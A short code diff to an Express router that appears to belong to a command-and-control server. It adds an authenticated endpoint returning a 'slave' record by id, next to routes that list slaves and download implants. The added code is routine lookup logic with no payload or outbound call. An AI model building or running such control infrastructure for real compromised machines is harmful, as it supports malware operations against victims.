@@ -100,6 +100,12 @@ router.get("/slaves", userMiddleware.hasAuthToken, (req, res) => {
     res.json(databaseHelper.getSlaves());
 })
 
+// Get slave by id.
+router.get("/slaves/:id", userMiddleware.hasAuthToken, (req, res) => {
+    
+    res.json(databaseHelper.getSlaveById(req.params.id))
+})
+
 // Implant downloader.
 router.get("/implant/:id", userMiddleware.hasAuthToken, (req, res) => {
 
